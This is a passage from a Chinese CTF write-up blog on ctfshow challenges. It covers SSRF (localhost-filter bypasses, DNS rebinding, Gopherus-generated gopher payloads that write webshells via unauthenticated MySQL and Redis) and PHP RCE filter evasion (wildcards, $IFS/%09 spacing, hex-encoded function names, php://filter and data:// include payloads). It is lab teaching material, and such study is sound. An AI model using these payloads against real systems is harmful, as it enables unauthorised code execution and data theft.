class="hljs php">http:<span class="hljs-comment">//sudo.cc/</span><br></code></pre></td></tr></table></figure><p>所以我们可以构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//sudo.cc/flag.php</span><br></code></pre></td></tr></table></figure><p>或者，修改自己的hosts文件，将 xx.yy  解析为 127.0.0.1即可</p><p>解法二：</p><p>可以将自己服务器作为中转，重定向到 <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><img src="https://s2.loli.net/2022/12/18/VajgozT7FlvWsrm.png" alt="image-20221218222153353" style="zoom:33%;" /><p>我的服务器上的a.php 中写有如上代码，所以payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//your-domain/a.php</span><br></code></pre></td></tr></table></figure><p>解法三：DNS-Rebinding</p><blockquote><p>自己去ceye.io注册绑定127.0.0.1然后记得前面加r</p><p>url&#x3D;<a href="http://r.xxxzc8.ceye.io/flag.php">http://r.xxxzc8.ceye.io/flag.php</a></p></blockquote><p>查看 profile</p><p>如果 ceye 域名中有 1，这题就用不了这种方法了</p><h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><img src="https://s2.loli.net/2022/12/18/Q6upFmSZbWNGUoa.png" alt="image-20221218222908784" style="zoom:33%;" /><p>限制域名长度&lt;&#x3D;5 ,我们可以使用 127.1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.1/flag.php</span><br></code></pre></td></tr></table></figure><h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><img src="https://s2.loli.net/2022/12/18/KIAQcf6MUZTDJqm.png" alt="image-20221218223054987" style="zoom:33%;" /><p>限制域名长度&lt;&#x3D;3 ,我们可以使用 0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//0/flag.php</span><br></code></pre></td></tr></table></figure><h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><p><img src="https://s2.loli.net/2022/12/18/8ldBVJEhPv6jnwe.png" alt="image-20221218223321644"></p><h4 id="gethostbyname"><a href="#gethostbyname" class="headerlink" title="gethostbyname()"></a>gethostbyname()</h4><p>​返回 服务器IP 网址</p><h4 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h4><p>函数通过指定的过滤器过滤变量。</p><p>如果成功，则返回已过滤的数据，如果失败，则返回 false。</p><p><img src="https://s2.loli.net/2022/12/18/BskCMhXcoIVWTzP.png" alt="image-20221218223628733"></p><h4 id="IP地址中的保留地址"><a href="#IP地址中的保留地址" class="headerlink" title="IP地址中的保留地址"></a>IP地址中的保留地址</h4><img src="https://s2.loli.net/2022/12/18/WERVgrKSLs7zN2l.png" alt="image-20221218223726729" style="zoom: 33%;" /><p>即，主机名解析的 IP 不能是保留地址或者是内网 IP。</p><p>我们可以使用前面的写法，把自己的服务器重定向即可，自己的服务器ip不在过滤范围内</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//your-domain/a.php</span><br></code></pre></td></tr></table></figure><h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><img src="https://s2.loli.net/2022/12/18/JUtIKNZBVl6yjO4.png" alt="image-20221218224123600" style="zoom:33%;" /><p>这一题正则匹配的意思是：url 以<a href="http://ctf/">http://ctf</a>. 开始   以show 结束。</p><p>我们可以借助 parse_url() 函数的特性，@后面的为域名hostname</p><p>于是，我们构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//ctf.@127.0.0.1/flag.php?show</span><br></code></pre></td></tr></table></figure><h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><p>打无密码的mysql</p><blockquote><p>为什么是无密码呢？</p><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP&#x2F;IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p></blockquote><p>我们点击login时使用bp抓包：</p><img src="https://s2.loli.net/2022/12/18/r75ywhI2os6xfXO.png" alt="image-20221218230945658" style="zoom: 25%;" /><p>发现请求体中，有一个类似url的字符串，可以对该地址进行请求</p><p>一般 SSRF 打内网应用主要还是通过协议，比如用的比较多的是 <strong>gopher</strong></p><p>具体怎么做呢？</p><p>细心的同学可能发现，无论是用 gopher 攻击 redis、mysql、还是 ftp，这些主要都是基于 tcp 协议为主。这和 <strong>gopher 协议的基本格式</strong>有关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">gopher:<span class="hljs-comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></code></pre></td></tr></table></figure><p>因为，如果想要打 MySQL 就需要知道 MySQL 通信时的 TCP 数据流，才能知道要怎么和 MySQL 通信，这里可以通过 Wireshark 抓包来分析</p><p>可以参考下面链接的 0x02 mysql协议分析部分</p><p><a href="https://www.freebuf.com/articles/web/159342.html">https://www.freebuf.com/articles/web/159342.html</a></p><p>不过这里有个更好用的工具 Gopherus</p><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>我们在kali中安装它</p><img src="https://s2.loli.net/2022/12/18/m9JyH83DXzd5QVR.png" alt="image-20221218231319217" style="zoom:33%;" /><p>他包含常见的应用 gopher 数据包的格式构造， 原理也是通过 Wireshark 抓包分析，然后写脚本。</p><p>注意使用 python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python2 gopherus.py --exploit mysql<br></code></pre></td></tr></table></figure><p>依次输入用户和要执行的SQL语句：</p><p><img src="https://s2.loli.net/2022/12/18/My8nODKILYVk25j.png" alt="image-20221218231634305"></p><p>当然，除了满足MySQL未授权外，还需要MySQL开启允许导出文件以及知道网站根目录，本漏洞才能成功利用，缺一不可。</p><p>这个 <code>/var/www/html</code> 目录是如何知道的呢？应该是爆破的…</p><p>生成的 POC 里，**<code>_</code> 字符后面的内容还要 URL编码一次*<em>，因为 PHP接收到POST或GET请求数据，会</em>自动进行一次URL解码*，然后，比如 %00 解码后，PHP会直接截断。。</p><p>二次url编码：</p><p><img src="https://s2.loli.net/2022/12/18/XgpuxK2GLl3iOnd.png" alt="image-20221218232306965"></p><p>进行拼接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">gopher:<span class="hljs-comment">//127.0.0.1:3306/_</span><br></code></pre></td></tr></table></figure><p>然后发包：</p><img src="https://s2.loli.net/2022/12/18/WvVDKugAPMJraR1.png" alt="image-20221218232512652" style="zoom:25%;" /><p>然后访问 &#x2F;c.php 并且使用post传参进行命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><p>打redis，与上题类似，只不过更换gopherus的端口号</p><img src="https://s2.loli.net/2022/12/18/QxtMnkRbjireugV.png" alt="image-20221218232921937" style="zoom:50%;" /><p><img src="https://s2.loli.net/2022/12/18/91eiWRysfGJCzbc.png" alt="image-20221218233054267"></p><p>将 _ 后的参数再进行url编码：</p><p><img src="https://s2.loli.net/2022/12/18/fnzPFJXbv5CTsQc.png" alt="image-20221218233158416"></p><p>与前面拼接后，发包</p><p><img src="https://s2.loli.net/2022/12/18/ebyRL1uzFDnPNJo.png" alt="image-20221218233455657"></p><p>然后访问 &#x2F;shell.php  get参数名为cmd进行命令执行</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_SSRF漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_php特性</title>
    <link href="/2023/08/24/ctfshow_php%E7%89%B9%E6%80%A7/"/>
    <url>/2023/08/24/ctfshow_php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h2 id="1、web-89-91"><a href="#1、web-89-91" class="headerlink" title="1、web 89-91"></a>1、web 89-91</h2><p>主要考察了intval()函数的使用，和正则表达式preg_match(),正则表达式匹配字符串，匹配数组返回值为false</p><h3 id="php-intval-函数"><a href="#php-intval-函数" class="headerlink" title="php intval()函数"></a>php intval()函数</h3><p><strong>intval()</strong> 函数用于获取变量的整数值。</p><p><strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><p>PHP 4, PHP 5, PHP 7</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">intval</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span> ] )<br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul><p>如果 base 是 <strong>0</strong>，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p><p>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>字符串有可能返回 0，虽然取决于字符串最左侧的字符。</p><img src="https://s2.loli.net/2022/11/25/clgi5PbwzFoDpQC.png" alt="image-20221101125612733" style="zoom: 33%;" /><h3 id="PHP-show-source-函数"><a href="#PHP-show-source-函数" class="headerlink" title="PHP show_source() 函数"></a>PHP show_source() 函数</h3><p><a href="https://www.w3school.com.cn/php/php_ref_misc.asp">PHP 杂项函数</a></p><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>show_source() 函数对文件进行语法高亮显示。</p><p>本函数是 <a href="https://www.w3school.com.cn/php/func_misc_highlight_file.asp">highlight_file()</a> 的别名。</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">show<span class="hljs-constructor">_source(<span class="hljs-params">filename</span>,<span class="hljs-params">return</span>)</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>filename</em></td><td align="left">必需。要进行高亮处理的 PHP 文件的路径。</td></tr><tr><td align="left"><em>return</em></td><td align="left">可选。如果设置 true，则本函数返回高亮处理的代码。</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_php特性</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_rce</title>
    <link href="/2023/08/24/ctfshow_rce/"/>
    <url>/2023/08/24/ctfshow_rce/</url>
    
    <content type="html"><![CDATA[<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><img src="https://s2.loli.net/2022/12/23/l7o8SJGUMkHqdpb.png" alt="image-20221223170033041" style="zoom: 33%;" /><p>分析代码，我们发现可以使用get传参将代码传入，使用c变量接收，然后传入eval()函数中进行代码执行</p><p>此处使用正则表达式过滤了flag关键字，我们可以使用通配符绕过</p><p>首先使用payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/23/LGTgM6KQOmfqaED.png" alt="image-20221223171221764" style="zoom:25%;" /><p>查询到当前目录下存在flag.php,所以我们只需要去访问改文件即可</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<br>?c=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<br>?c=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fla\g.php&#x27;</span>);    <span class="hljs-comment">//使用反斜杠转义绕过正则</span><br>?c=<span class="hljs-keyword">echo</span> `nl fla<span class="hljs-string">&#x27;&#x27;</span>g.php`;    <span class="hljs-comment">//使用引号干扰正则匹配</span><br>...<br></code></pre></td></tr></table></figure><p>即可得到flag</p><img src="https://s2.loli.net/2022/12/23/3tJdeTKc1sYayML.png" alt="image-20221223172027051" style="zoom: 25%;" /><h4 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h4><img src="https://s2.loli.net/2022/12/23/NQLMtjE8yo1cPs4.png" alt="image-20221223170257027" style="zoom:33%;" /><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>过滤了php，system</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">echo</span> `cat f*`;<br>?c=<span class="hljs-keyword">echo</span> `tac fla<span class="hljs-string">&#x27;&#x27;</span>g.php`;<br>?c=<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;nl fla?.php&#x27;</span>);   <span class="hljs-comment">//shell_exec() 与反引号作用类似</span><br>?c=<span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<br>?c=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<br>?c=`mv fla?.p?? <span class="hljs-number">1</span>.txt`;   <span class="hljs-comment">//将flag.php 重命名为 1.txt 直接访问/1.txt得到flag</span><br>?c=`cp fla?.??? <span class="hljs-number">2</span>.txt`;  <span class="hljs-comment">//将flag.php 复制给 2.txt</span><br>...<br></code></pre></td></tr></table></figure><p>还有一种巧妙地方法</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><h4 id="localeconv-函数"><a href="#localeconv-函数" class="headerlink" title="localeconv()函数"></a>localeconv()函数</h4><blockquote><p>localeconv() 函数返回一包含本地数字及货币格式信息的<strong>数组</strong>。</p></blockquote><img src="https://s2.loli.net/2022/12/23/whIDnR3yr2zXMZv.png" alt="image-20221223181323711" style="zoom:25%;" /><p>这个数组的第一个元素就是小数点</p><p>于是，我们可以使用 php 中 </p><h4 id="current-、pos-函数"><a href="#current-、pos-函数" class="headerlink" title="current()、pos()函数"></a>current()、pos()函数</h4><p>获取第一个元素的值，即小数点（.）</p><img src="https://s2.loli.net/2022/12/23/oyG8zHIOnwvC3Ff.png" alt="image-20221223181508035" style="zoom:33%;" /><p>然后我们可以使用</p><h4 id="scandir-函数"><a href="#scandir-函数" class="headerlink" title="scandir()函数"></a>scandir()函数</h4><blockquote><p>scandir() 函数返回指定目录中的文件和目录的<strong>数组</strong>。</p></blockquote><p>scandir(‘.’) 代表返回当前目录下文件和目录的数组</p><p>由于题目中 flag.php  所处数组倒数第二的位置，</p><p>我们可以使用 array_reverse() 函数</p><h4 id="array-reverse-函数"><a href="#array-reverse-函数" class="headerlink" title="array_reverse() 函数"></a>array_reverse() 函数</h4><blockquote><h5 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h5><p>array_reverse() 函数以相反的元素顺序返回数组。</p><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><p>array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。</p><p>如果第二个参数指定为 true，则元素的键名保持不变，否则键名将丢失。</p></blockquote><p>然后使用 next() 获得第二个位置的元素 flag.php </p><p>接着使用 show_source() 函数将文件进行高亮显示即可：</p><h4 id="show-source-函数"><a href="#show-source-函数" class="headerlink" title="show_source() 函数"></a>show_source() 函数</h4><blockquote><h5 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h5><p>show_source() 函数对文件进行语法高亮显示。</p><p>本函数是 <a href="https://www.w3school.com.cn/php/func_misc_highlight_file.asp">highlight_file()</a> 的别名。</p></blockquote><p>因此 payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>把空格，单引号等过滤了</p><p>空格绕过： $IFS, ${IFS}, $IFS$9, %09</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)))));<br></code></pre></td></tr></table></figure><blockquote><p>__ FILE __ :被称为PHP魔术常量,返回当前执行PHP脚本的完整路径和文件名,包含一个绝对路径dirname(__ FILE __) 一般会返回文件所的当前目录到系统根目录的一个目录结构。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&quot;tac%09f*&quot;</span>);   <span class="hljs-comment">// 双引号绕过单引号，%09绕过空格</span><br>?c=<span class="hljs-title function_ invoke__">print_r</span>(`nl%<span class="hljs-number">09</span>fl[abc]*`);<br>?c=<span class="hljs-string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(<span class="hljs-string">&quot;nl%09fl[a]*&quot;</span>);  <br><span class="hljs-comment">// \x73\x79\x73\x74\x65\x6d 代表了16进制的system</span><br>?c=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<br>?c=<span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`strings\$&#123;IFS&#125;f*`;     <span class="hljs-comment">// $必须反斜杠转义  </span><br></code></pre></td></tr></table></figure><blockquote><p><strong>strings</strong> 命令是二进制工具集 GNU Binutils  的一员，用于打印文件中可打印字符串，strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p></blockquote><h3 id="web32-36"><a href="#web32-36" class="headerlink" title="web32-36"></a>web32-36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这次又把 反引号 &#96;  , echo , 分号；  小括号 ( 给过滤了</p><p>所以，我们需要使用一种不需要括号的语句，我们可以想到包含文件的 include</p><p>但是这里把  分号 ;  给过滤了，我们可以使用 ?&gt;  去代替</p><p>于是我们可以利用文件包含漏洞</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">include</span>%<span class="hljs-number">09</span><span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span><br>post： <span class="hljs-number">1</span>=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></code></pre></td></tr></table></figure><blockquote><p><code>php://filter</code>是<code>php</code>中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如<code>base64</code>编码处理，<code>rot13</code>处理等。</p></blockquote><p>这里就可以将 flag.php 文件base64编码，然后解码就可得到flag·</p><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><blockquote><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它<strong>与包含函数结合</strong>时，用户输入的data:&#x2F;&#x2F;流会被<strong>当作php文件执行</strong>。</p></blockquote><p>实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、data:<span class="hljs-comment">//text/plain,</span><br>http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br> <br><span class="hljs-number">2</span>、data:<span class="hljs-comment">//text/plain;base64,</span><br>http:<span class="hljs-comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></code></pre></td></tr></table></figure><p>于是我们可以使用payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span 